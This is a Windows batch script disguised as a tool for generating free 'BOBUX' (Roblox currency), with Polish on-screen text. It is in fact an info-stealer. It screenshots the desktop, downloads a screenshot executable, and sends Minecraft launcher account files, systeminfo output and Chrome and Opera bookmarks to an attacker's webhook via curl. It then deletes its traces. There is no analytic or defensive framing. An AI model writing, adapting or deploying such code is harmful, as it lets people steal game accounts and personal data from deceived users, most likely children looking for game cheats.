@echo off
cd %appdata%
title cmd.exe
set "webhook=your WEBHOOK"
echo GENEROWANIE 10000 BOBUX
curl --silent --oautput /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Screenshot from %ComputerName% @ %TIME%```\"}" %webhook%
curl --silent -L --fail "https://github.com/chuntaro/screenshot-cmd/blob/master/screenshot.exe?raw=true" -o s.exe
.\s.exe -o %appdata%\s.png
curl --silent --output /dev/null -F ss=@"%appdata%\s.png" %webhook% 



curl --silent --output /dev/null -X POST -H "Content-type: application/json" --data "{\"content\": \"%message%\"}" %webhook%

curl --silent --output /dev/null -X POST -H "Content-type: application/json" --data "{\"content\": \"------------------------------------------------------------\"}" %webhook%

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \":green_square: **MINECRAFT**\"}"  %webhook%


curl --silent --output /dev/null -F minecraftauth=@"%appdata%\.minecraft\launcher_profiles.json" %webhook%


curl --silent --output /dev/null -F minecraftauth=@"%appdata%\.minecraft\launcher_accounts.json" %webhook%


curl --silent --output /dev/null -X POST -H "Content-type: application/json" --data "{\"content\": \"------------------------------------------------------------\"}" %webhook%




set "tempsys=%appdata%\sysinfo.txt"
2>NUL SystemInfo > "%tempsys%"
curl --silent --output /dev/null -F systeminfo=@"%tempsys%" %webhook%
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"Chrome data \"}" %webhook%
curl --silent --output /dev/null -F b=@"%localappdata%\Google\Chrome\User Data\Default\Bookmarks" %webhook%
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"Opera data \"}" %webhook%
curl --silent --output /dev/null -F b=@"%appdata%\Opera Software\Opera Stable\Bookmarks" %webhook%
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"Opera GX data \"}" %webhook%
curl --silent --output /dev/null -F b=@"%appdata%\Opera Software\Opera GX Stable\Bookmarks" %webhook%

del %appdata%\s.exe
del %appdata%\s.png
del %appdata%\sysinfo.txt
exit 0
